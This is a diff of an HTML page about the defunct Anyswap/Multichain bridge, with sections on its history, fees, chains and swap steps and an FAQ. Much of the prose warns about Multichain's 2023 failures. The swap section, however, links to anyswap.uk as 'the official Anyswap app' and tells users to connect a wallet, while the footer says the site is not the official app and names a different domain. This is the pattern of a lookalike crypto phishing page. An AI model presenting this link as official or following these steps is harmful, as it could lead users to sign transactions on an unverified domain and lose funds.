+  <section class="section" id="about"><div class="container"><h2>What is Anyswap?</h2><div class="capsule"><strong>Anyswap</strong> is the legacy cross-chain swap and bridge brand that later rebranded to <a href="https://multichain.org/" target="_blank" rel="noopener noreferrer">Multichain</a>, a router for Web3 cross-chain interactions described in the <a href="https://docs.multichain.org/" target="_blank" rel="noopener noreferrer">Multichain documentation</a> and built on the <a href="https://github.com/anyswap" target="_blank" rel="noopener noreferrer">open-source Anyswap repositories</a>. Use this page as an app-first route, then verify the domain before connecting a wallet.</div></div></section>
+  <section class="section" id="facts"><div class="container"><h2>Anyswap at a glance</h2><div class="facts"><div class="f"><small>Category</small><b>Cross-chain bridge</b></div><div class="f"><small>Network</small><b>Multi-chain</b></div><div class="f"><small>Token</small><b>ANY / MULTI</b></div><div class="f"><small>Launched</small><b>2020</b></div><div class="f"><small>Custody</small><b>Bridge smart contracts and router liquidity</b></div></div></div></section>
+  <section class="section section-alt"><div class="container"><h2>Anyswap bridge and Multichain status</h2><div class="intent-a">Anyswap is best researched today as the legacy name for Multichain, a cross-chain router and bridge system. Users still search "Anyswap bridge" when trying to understand old routes, token contracts, or transactions, but current usage should be approached carefully because Multichain experienced <a href="https://defillama.com/protocol/multichain" target="_blank" rel="noopener noreferrer">major operational and security failures in 2023</a> that collapsed its bridged liquidity. The high-value query is not just how to bridge; it is whether a route is live, supported, and safe for a specific token. Before interacting with any Anyswap or Multichain contract, users should verify the official domain, route status, on-chain <a href="https://etherscan.io/" target="_blank" rel="noopener noreferrer">explorer activity</a>, token issuer guidance, and whether the destination token still has reliable redemption or liquidity.</div></div></section><section class="section"><div class="container"><h2>Anyswap fees and bridge speed</h2><div class="intent-a">Anyswap and Multichain fees historically depended on the token route, source chain gas, destination chain gas, liquidity, and whether the bridge used a mint/burn or liquidity-pool design. Speed could vary from minutes to much longer if liquidity, confirmations, or route infrastructure were constrained. For legacy transactions, users should inspect the transaction hash on both source and destination explorers such as <a href="https://etherscan.io/" target="_blank" rel="noopener noreferrer">Etherscan</a> and compare it with the router's status page if available. For new transfers, the safer assumption is that fees and time estimates from old articles may be stale. A modern bridge decision should prioritize live route health and issuer-supported <a href="https://ethereum.org/en/bridges/" target="_blank" rel="noopener noreferrer">canonical bridges</a>.</div></div></section><section class="section section-alt"><div class="container"><h2>Anyswap supported chains and assets</h2><div class="intent-a">Anyswap and Multichain became known for broad cross-chain support across EVM and non-EVM ecosystems, with market and chain coverage still listed on <a href="https://www.coingecko.com/en/coins/multichain" target="_blank" rel="noopener noreferrer">CoinGecko</a>, but historical support is not the same as safe current support. A route can appear in an old UI, blog post, or explorer while liquidity, issuer backing, or bridge operations are impaired. Users should check the exact asset, source chain, destination chain, and token issuer recommendation. For blue-chip assets, canonical bridges or issuer-native transfers are usually easier to verify. For long-tail assets, the key risk is not only failed transfer; it is receiving a bridged token that has weak liquidity or no trusted redemption path.</div></div></section>
+  <section class="section"><div class="container"><h2>How to swap Anyswap</h2><ol class="steps"><li><b>Open the app</b><span>Use the official app link and check the domain before connecting a wallet.</span></li><li><b>Connect wallet</b><span>Select a compatible Web3 wallet and switch to the source network shown in the interface.</span></li><li><b>Choose route</b><span>Pick the asset, source network, destination network, and amount, then review the displayed route.</span></li><li><b>Confirm on-chain</b><span>Approve only the transactions you understand and keep enough native gas on the source network.</span></li></ol><div class="cta-band"><div><p>Ready to swap?</p><p class="sub">Open the official Anyswap app and verify the domain before you sign.</p></div><a class="btn btn-green" href="https://anyswap.uk/" target="_blank" rel="noopener noreferrer">Open Anyswap ↗</a></div></div></section>
+  <section class="section"><div class="container"><h2>Anyswap vs modern canonical bridges</h2><div class="cmp-wrap"><table class="cmp-table"><thead><tr><th>Dimension</th><th>Anyswap / Multichain</th><th>Canonical bridge</th></tr></thead><tbody><tr><td>Route model</td><td>Third-party cross-chain router</td><td>Issuer or network-supported path</td></tr><tr><td>Current risk</td><td>Legacy operational and liquidity concerns</td><td>Depends on chain security and bridge design</td></tr><tr><td>Best use</td><td>Historical transaction research</td><td>Current supported transfers</td></tr><tr><td>Verification</td><td>Check route, contract, and status carefully</td><td>Check official chain or token issuer docs</td></tr></tbody></table></div></div></section>
+  <section class="section section-alt" id="faq"><div class="container"><h2>Anyswap FAQ</h2><div class="faq-list"><details open><summary><h3>Is Anyswap the same as Multichain?</h3></summary><div>Anyswap rebranded into Multichain, so many old Anyswap searches refer to the <a href="https://multichain.org/" target="_blank" rel="noopener noreferrer">Multichain bridge and router ecosystem</a>. The names are connected, but users should treat old Anyswap guides as historical. Current safety, route status, token contracts, and liquidity need fresh verification before any transaction.</div></details><details><summary><h3>Can I still use Anyswap bridge?</h3></summary><div>Users should be extremely cautious about using Anyswap or Multichain routes. The project suffered <a href="https://defillama.com/protocol/multichain" target="_blank" rel="noopener noreferrer">serious operational and security issues</a>, and route availability may not imply safe redemption. Before sending funds, verify official status, token issuer guidance, recent successful transactions, liquidity, and whether a safer canonical bridge exists.</div></details><details><summary><h3>What happened to the ANY token?</h3></summary><div>ANY was the earlier token associated with Anyswap before Multichain branding and token changes. Holders should verify any migration or exchange handling through official announcements and <a href="https://www.coingecko.com/en/coins/multichain" target="_blank" rel="noopener noreferrer">market listings</a>. A visible on-chain token balance does not prove that a migration is active, that liquidity is deep, or that exchanges support deposits.</div></details><details><summary><h3>Why is my Anyswap transaction pending?</h3></summary><div>A pending or incomplete Anyswap transaction can come from source-chain confirmation delay, bridge liquidity issues, router problems, destination-chain congestion, or a route that is no longer operating normally. Users should save the transaction hash, check both chain explorers such as <a href="https://etherscan.io/" target="_blank" rel="noopener noreferrer">Etherscan</a>, and avoid sending repeated transfers until the route status is understood.</div></details><details><summary><h3>Are Anyswap bridged tokens canonical?</h3></summary><div>Not necessarily. A bridged token from Anyswap or Multichain may be a representation issued by the bridge rather than the canonical token for the destination chain. Canonical status depends on the token issuer and chain ecosystem. Users should verify with the token project's official docs and the chain's <a href="https://ethereum.org/en/bridges/" target="_blank" rel="noopener noreferrer">bridge guidance</a> before depositing bridged assets into exchanges or protocols.</div></details><details><summary><h3>What is the safest alternative to Anyswap?</h3></summary><div>The safer alternative is usually the official bridge recommended by the chain or token issuer, such as a network bridge, issuer-supported mint-and-burn system, or well-maintained current bridge with transparent risk disclosures. The best choice depends on the exact asset and chains, and the <a href="https://ethereum.org/en/bridges/" target="_blank" rel="noopener noreferrer">official chain bridge directory</a> is a safer starting point. A route should be judged by live support, liquidity, and audit history.</div></details></div></div></section>
 </main>
 <footer class="site-footer"><div class="container">
-<nav aria-label="Footer" class="footer-nav"><a href="#how-it-worked">How it worked</a><a href="#status-and-risk">Status &amp; risk</a><a href="#tokens-and-fees">Tokens &amp; fees</a><a href="#terms">Terms</a><a href="#legacy-chain-context">Legacy chain context</a><a href="#faq">FAQ</a></nav>
-<p class="footer-note">Not the official Anyswap app — verify the domain before connecting a wallet. Information on this page is for educational purposes only and is not financial advice.</p>
-<p class="footer-meta"><a href="#top">Back to top ↑</a></p>
+  <p class="footer-note">Not the official app; verify anyswap-v2.github.io before connecting a wallet. Educational only, not financial advice.</p>
+  <p class="footer-meta"><a href="#top">Back to top ↑</a></p>
 </div></footer>
-<script defer="" src="static/app.js"></script>
+<script src="static/app.js" defer></script>
 </body></html>
